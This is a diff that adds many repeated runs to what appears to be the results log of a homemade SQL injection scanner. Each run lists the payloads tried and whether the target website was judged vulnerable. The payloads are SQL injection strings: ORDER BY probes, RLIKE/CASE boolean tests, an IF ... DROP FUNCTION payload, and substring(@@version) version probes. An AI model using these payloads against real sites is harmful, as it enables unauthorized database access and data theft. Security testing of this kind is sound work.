@@ -1,4 +1,4 @@
-## Date: 21-03-2024 ~ Time: 00:17:07 ##
+## Date: 31-03-2024 ~ Time: 00:25:50 ##
 --------------------------------------------------
 Scan Result: False
 Scan Description: The payload < ORDER BY 26> was not injected.
@@ -65,4 +65,357 @@ __________________________________________________
 Scan Result: True
 Scan Description: Website is vulnerable to Error based SQL Injection attack!
 Injected payload: < and (select substring(@@version,3,1))='X'>.
+__________________________________________________
+## Date: 31-03-2024 ~ Time: 00:32:51 ##
+--------------------------------------------------
+## Date: 01-04-2024 ~ Time: 16:30:36 ##
+--------------------------------------------------
+Scan Result: False
+Scan Description: The payload < ORDER BY 26> was not injected.
+__________________________________________________
+Scan Result: False
+Scan Description: The payload < ORDER BY 27> was not injected.
+__________________________________________________
+Scan Result: False
+Scan Description: The payload < ORDER BY 28> was not injected.
+__________________________________________________
+Scan Result: False
+Scan Description: The payload < ORDER BY 29> was not injected.
+__________________________________________________
+Scan Result: False
+Scan Description: The payload < ORDER BY 30> was not injected.
+__________________________________________________
+Scan Result: False
+Scan Description: The payload < ORDER BY 31337> was not injected.
+__________________________________________________
+Scan Result: True
+Scan Description: Website is vulnerable to Error based SQL Injection attack!
+Injected payload: < RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='>.
+__________________________________________________
+Scan Result: True
+Scan Description: Website is vulnerable to Error based SQL Injection attack!
+Injected payload: < RLIKE (SELECT (CASE WHEN (4346=4347) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='>.
+__________________________________________________
+Scan Result: False
+Scan Description: The payload <IF(7423=7424) SELECT 7423 ELSE DROP FUNCTION xcjl--> was not injected.
+__________________________________________________
+Scan Result: False
+Scan Description: The payload <IF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl--> was not injected.
+__________________________________________________
+Scan Result: False
+Scan Description: The payload <%' AND 8310=8310 AND '%'='> was not injected.
+__________________________________________________
+Scan Result: False
+Scan Description: The payload <%' AND 8310=8311 AND '%'='> was not injected.
+__________________________________________________
+Scan Result: True
+Scan Description: Website is vulnerable to Error based SQL Injection attack!
+Injected payload: < and (select substring(@@version,1,1))='X'>.
+__________________________________________________
+Scan Result: True
+Scan Description: Website is vulnerable to Error based SQL Injection attack!
+Injected payload: < and (select substring(@@version,1,1))='M'>.
+__________________________________________________
+Scan Result: True
+Scan Description: Website is vulnerable to Error based SQL Injection attack!
+Injected payload: < and (select substring(@@version,2,1))='i'>.
+__________________________________________________
+Scan Result: True
+Scan Description: Website is vulnerable to Error based SQL Injection attack!
+Injected payload: < and (select substring(@@version,2,1))='y'>.
+__________________________________________________
+Scan Result: True
+Scan Description: Website is vulnerable to Error based SQL Injection attack!
+Injected payload: < and (select substring(@@version,3,1))='c'>.
+__________________________________________________
+Scan Result: True
+Scan Description: Website is vulnerable to Error based SQL Injection attack!
+Injected payload: < and (select substring(@@version,3,1))='S'>.
+__________________________________________________
+Scan Result: True
+Scan Description: Website is vulnerable to Error based SQL Injection attack!
+Injected payload: < and (select substring(@@version,3,1))='X'>.
+__________________________________________________
+## Date: 04-04-2024 ~ Time: 23:20:24 ##
+--------------------------------------------------
+Scan Result: False
+Scan Description: The payload < ORDER BY 26> was not injected.
+__________________________________________________
+Scan Result: False
+Scan Description: The payload < ORDER BY 27> was not injected.
+__________________________________________________
+Scan Result: False
+Scan Description: The payload < ORDER BY 28> was not injected.
+__________________________________________________
+Scan Result: False
+Scan Description: The payload < ORDER BY 29> was not injected.
+__________________________________________________
+Scan Result: False
+Scan Description: The payload < ORDER BY 30> was not injected.
+__________________________________________________
+Scan Result: False
+Scan Description: The payload < ORDER BY 31337> was not injected.
+__________________________________________________
+Scan Result: True
+Scan Description: Website is vulnerable to Error based SQL Injection attack!
+Injected payload: < RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='>.
+__________________________________________________
+Scan Result: True
+Scan Description: Website is vulnerable to Error based SQL Injection attack!
+Injected payload: < RLIKE (SELECT (CASE WHEN (4346=4347) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='>.
+__________________________________________________
+Scan Result: False
+Scan Description: The payload <IF(7423=7424) SELECT 7423 ELSE DROP FUNCTION xcjl--> was not injected.
+__________________________________________________
+Scan Result: False
+Scan Description: The payload <IF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl--> was not injected.
+__________________________________________________
+Scan Result: False
+Scan Description: The payload <%' AND 8310=8310 AND '%'='> was not injected.
+__________________________________________________
+Scan Result: False
+Scan Description: The payload <%' AND 8310=8311 AND '%'='> was not injected.
+__________________________________________________
+Scan Result: True
+Scan Description: Website is vulnerable to Error based SQL Injection attack!
+Injected payload: < and (select substring(@@version,1,1))='X'>.
+__________________________________________________
+Scan Result: True
+Scan Description: Website is vulnerable to Error based SQL Injection attack!
+Injected payload: < and (select substring(@@version,1,1))='M'>.
+__________________________________________________
+Scan Result: True
+Scan Description: Website is vulnerable to Error based SQL Injection attack!
+Injected payload: < and (select substring(@@version,2,1))='i'>.
+__________________________________________________
+Scan Result: True
+Scan Description: Website is vulnerable to Error based SQL Injection attack!
+Injected payload: < and (select substring(@@version,2,1))='y'>.
+__________________________________________________
+Scan Result: True
+Scan Description: Website is vulnerable to Error based SQL Injection attack!
+Injected payload: < and (select substring(@@version,3,1))='c'>.
+__________________________________________________
+Scan Result: True
+Scan Description: Website is vulnerable to Error based SQL Injection attack!
+Injected payload: < and (select substring(@@version,3,1))='S'>.
+__________________________________________________
+Scan Result: True
+Scan Description: Website is vulnerable to Error based SQL Injection attack!
+Injected payload: < and (select substring(@@version,3,1))='X'>.
+__________________________________________________
+## Date: 04-04-2024 ~ Time: 23:21:27 ##
+--------------------------------------------------
+Scan Result: False
+Scan Description: The payload < ORDER BY 26> was not injected.
+__________________________________________________
+Scan Result: False
+Scan Description: The payload < ORDER BY 27> was not injected.
+__________________________________________________
+Scan Result: False
+Scan Description: The payload < ORDER BY 28> was not injected.
+__________________________________________________
+Scan Result: False
+Scan Description: The payload < ORDER BY 29> was not injected.
+__________________________________________________
+Scan Result: False
+Scan Description: The payload < ORDER BY 30> was not injected.
+__________________________________________________
+Scan Result: False
+Scan Description: The payload < ORDER BY 31337> was not injected.
+__________________________________________________
+Scan Result: True
+Scan Description: Website is vulnerable to Error based SQL Injection attack!
+Injected payload: < RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='>.
+__________________________________________________
+Scan Result: True
+Scan Description: Website is vulnerable to Error based SQL Injection attack!
+Injected payload: < RLIKE (SELECT (CASE WHEN (4346=4347) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='>.
+__________________________________________________
+Scan Result: False
+Scan Description: The payload <IF(7423=7424) SELECT 7423 ELSE DROP FUNCTION xcjl--> was not injected.
+__________________________________________________
+Scan Result: False
+Scan Description: The payload <IF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl--> was not injected.
+__________________________________________________
+Scan Result: False
+Scan Description: The payload <%' AND 8310=8310 AND '%'='> was not injected.
+__________________________________________________
+Scan Result: False
+Scan Description: The payload <%' AND 8310=8311 AND '%'='> was not injected.
+__________________________________________________
+Scan Result: True
+Scan Description: Website is vulnerable to Error based SQL Injection attack!
+Injected payload: < and (select substring(@@version,1,1))='X'>.
+__________________________________________________
+Scan Result: True
+Scan Description: Website is vulnerable to Error based SQL Injection attack!
+Injected payload: < and (select substring(@@version,1,1))='M'>.
+__________________________________________________
+Scan Result: True
+Scan Description: Website is vulnerable to Error based SQL Injection attack!
+Injected payload: < and (select substring(@@version,2,1))='i'>.
+__________________________________________________
+Scan Result: True
+Scan Description: Website is vulnerable to Error based SQL Injection attack!
+Injected payload: < and (select substring(@@version,2,1))='y'>.
+__________________________________________________
+Scan Result: True
+Scan Description: Website is vulnerable to Error based SQL Injection attack!
+Injected payload: < and (select substring(@@version,3,1))='c'>.
+__________________________________________________
+Scan Result: True
+Scan Description: Website is vulnerable to Error based SQL Injection attack!
+Injected payload: < and (select substring(@@version,3,1))='S'>.
+__________________________________________________
+Scan Result: True
+Scan Description: Website is vulnerable to Error based SQL Injection attack!
+Injected payload: < and (select substring(@@version,3,1))='X'>.
+__________________________________________________
+Scan Result: False
+Scan Description: The payload <test> was not injected.
+__________________________________________________
+## Date: 04-04-2024 ~ Time: 23:31:47 ##
+--------------------------------------------------
+Scan Result: False
+Scan Description: The payload < ORDER BY 26> was not injected.
+__________________________________________________
+Scan Result: False
+Scan Description: The payload < ORDER BY 27> was not injected.
+__________________________________________________
+Scan Result: False
+Scan Description: The payload < ORDER BY 28> was not injected.
+__________________________________________________
+Scan Result: False
+Scan Description: The payload < ORDER BY 29> was not injected.
+__________________________________________________
+Scan Result: False
+Scan Description: The payload < ORDER BY 30> was not injected.
+__________________________________________________
+Scan Result: False
+Scan Description: The payload < ORDER BY 31337> was not injected.
+__________________________________________________
+Scan Result: True
+Scan Description: Website is vulnerable to Error based SQL Injection attack!
+Injected payload: < RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='>.
+__________________________________________________
+Scan Result: True
+Scan Description: Website is vulnerable to Error based SQL Injection attack!
+Injected payload: < RLIKE (SELECT (CASE WHEN (4346=4347) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='>.
+__________________________________________________
+Scan Result: False
+Scan Description: The payload <IF(7423=7424) SELECT 7423 ELSE DROP FUNCTION xcjl--> was not injected.
+__________________________________________________
+Scan Result: False
+Scan Description: The payload <IF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl--> was not injected.
+__________________________________________________
+Scan Result: False
+Scan Description: The payload <%' AND 8310=8310 AND '%'='> was not injected.
+__________________________________________________
+Scan Result: False
+Scan Description: The payload <%' AND 8310=8311 AND '%'='> was not injected.
+__________________________________________________
+Scan Result: True
+Scan Description: Website is vulnerable to Error based SQL Injection attack!
+Injected payload: < and (select substring(@@version,1,1))='X'>.
+__________________________________________________
+Scan Result: True
+Scan Description: Website is vulnerable to Error based SQL Injection attack!
+Injected payload: < and (select substring(@@version,1,1))='M'>.
+__________________________________________________
+Scan Result: True
+Scan Description: Website is vulnerable to Error based SQL Injection attack!
+Injected payload: < and (select substring(@@version,2,1))='i'>.
+__________________________________________________
+Scan Result: True
+Scan Description: Website is vulnerable to Error based SQL Injection attack!
+Injected payload: < and (select substring(@@version,2,1))='y'>.
+__________________________________________________
+Scan Result: True
+Scan Description: Website is vulnerable to Error based SQL Injection attack!
+Injected payload: < and (select substring(@@version,3,1))='c'>.
+__________________________________________________
+Scan Result: True
+Scan Description: Website is vulnerable to Error based SQL Injection attack!
+Injected payload: < and (select substring(@@version,3,1))='S'>.
+__________________________________________________
+Scan Result: True
+Scan Description: Website is vulnerable to Error based SQL Injection attack!
+Injected payload: < and (select substring(@@version,3,1))='X'>.
+__________________________________________________
+Scan Result: False
+Scan Description: The payload <test> was not injected.
+__________________________________________________
+## Date: 05-04-2024 ~ Time: 00:59:40 ##
+--------------------------------------------------
+## Date: 05-04-2024 ~ Time: 01:02:17 ##
+--------------------------------------------------
+Scan Result: False
+Scan Description: The payload < ORDER BY 26> was not injected.
+__________________________________________________
+Scan Result: False
+Scan Description: The payload < ORDER BY 27> was not injected.
+__________________________________________________
+Scan Result: False
+Scan Description: The payload < ORDER BY 28> was not injected.
+__________________________________________________
+Scan Result: False
+Scan Description: The payload < ORDER BY 29> was not injected.
+__________________________________________________
+Scan Result: False
+Scan Description: The payload < ORDER BY 30> was not injected.
+__________________________________________________
+Scan Result: False
+Scan Description: The payload < ORDER BY 31337> was not injected.
+__________________________________________________
+Scan Result: True
+Scan Description: Website is vulnerable to Error based SQL Injection attack!
+Injected payload: < RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='>.
+__________________________________________________
+Scan Result: True
+Scan Description: Website is vulnerable to Error based SQL Injection attack!
+Injected payload: < RLIKE (SELECT (CASE WHEN (4346=4347) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='>.
+__________________________________________________
+Scan Result: False
+Scan Description: The payload <IF(7423=7424) SELECT 7423 ELSE DROP FUNCTION xcjl--> was not injected.
+__________________________________________________
+Scan Result: False
+Scan Description: The payload <IF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl--> was not injected.
+__________________________________________________
+Scan Result: False
+Scan Description: The payload <%' AND 8310=8310 AND '%'='> was not injected.
+__________________________________________________
+Scan Result: False
+Scan Description: The payload <%' AND 8310=8311 AND '%'='> was not injected.
+__________________________________________________
+Scan Result: True
+Scan Description: Website is vulnerable to Error based SQL Injection attack!
+Injected payload: < and (select substring(@@version,1,1))='X'>.
+__________________________________________________
+Scan Result: True
+Scan Description: Website is vulnerable to Error based SQL Injection attack!
+Injected payload: < and (select substring(@@version,1,1))='M'>.
+__________________________________________________
+Scan Result: True
+Scan Description: Website is vulnerable to Error based SQL Injection attack!
+Injected payload: < and (select substring(@@version,2,1))='i'>.
+__________________________________________________
+Scan Result: True
+Scan Description: Website is vulnerable to Error based SQL Injection attack!
+Injected payload: < and (select substring(@@version,2,1))='y'>.
+__________________________________________________
+Scan Result: True
+Scan Description: Website is vulnerable to Error based SQL Injection attack!
+Injected payload: < and (select substring(@@version,3,1))='c'>.
+__________________________________________________
+Scan Result: True
+Scan Description: Website is vulnerable to Error based SQL Injection attack!
+Injected payload: < and (select substring(@@version,3,1))='S'>.
+__________________________________________________
+Scan Result: True
+Scan Description: Website is vulnerable to Error based SQL Injection attack!
+Injected payload: < and (select substring(@@version,3,1))='X'>.
+__________________________________________________
+Scan Result: False
+Scan Description: The payload <test> was not injected.
 __________________________________________________
